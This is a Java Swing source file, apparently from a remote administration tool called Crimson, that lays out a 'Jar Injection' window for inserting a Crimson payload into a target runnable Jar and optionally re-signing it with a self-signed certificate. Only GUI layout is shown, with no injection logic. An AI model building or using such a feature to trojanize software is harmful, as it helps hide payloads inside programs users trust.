package subterranean.crimson.server.graphics;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.awt.Color;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.border.EmptyBorder;

public class GenerateInjectedJar extends JFrame {

	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private JTextField textField;
	private JTextField textField_1;

	public GenerateInjectedJar() {
		setTitle("Jar Injection");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 607, 377);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(null);

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(0, 0, 440, 270);
		contentPane.add(tabbedPane);

		JPanel info_panel = new JPanel();
		tabbedPane.addTab("Information", null, info_panel, null);
		info_panel.setLayout(null);

		JTextArea txtrTheJarInjection = new JTextArea();
		txtrTheJarInjection.setText("The Jar Injection method can inject a Crimson payload into a runnable Jar file.  This is useful for integrating Crimson into another administration tool or into a set of utilities.  Injecting into a signed Jar will unsign it.");
		txtrTheJarInjection.setBackground(new Color(0, 0, 0, 0));
		txtrTheJarInjection.setOpaque(false);

		txtrTheJarInjection.setWrapStyleWord(true);
		txtrTheJarInjection.setLineWrap(true);
		txtrTheJarInjection.setBounds(12, 12, 411, 218);
		info_panel.add(txtrTheJarInjection);

		JPanel inject_panel = new JPanel();
		tabbedPane.addTab("Inject", null, inject_panel, null);
		inject_panel.setLayout(null);

		textField = new JTextField();
		textField.setBounds(95, 12, 104, 20);
		inject_panel.add(textField);
		textField.setColumns(10);

		textField_1 = new JTextField();
		textField_1.setBounds(95, 44, 104, 20);
		inject_panel.add(textField_1);
		textField_1.setColumns(10);

		JCheckBox chckbxNewCheckBox = new JCheckBox("Resign Jar with Self-Signed Certificate");
		chckbxNewCheckBox.setBounds(22, 72, 266, 24);
		inject_panel.add(chckbxNewCheckBox);

		JButton btnNewButton = new JButton("Inject");
		btnNewButton.setBounds(325, 204, 98, 26);
		inject_panel.add(btnNewButton);

		JLabel lblTargetJar = new JLabel("Target Jar:");
		lblTargetJar.setBounds(12, 14, 65, 16);
		inject_panel.add(lblTargetJar);

		JLabel lblPayloadJar = new JLabel("Payload Jar:");
		lblPayloadJar.setBounds(12, 46, 72, 16);
		inject_panel.add(lblPayloadJar);
	}
}
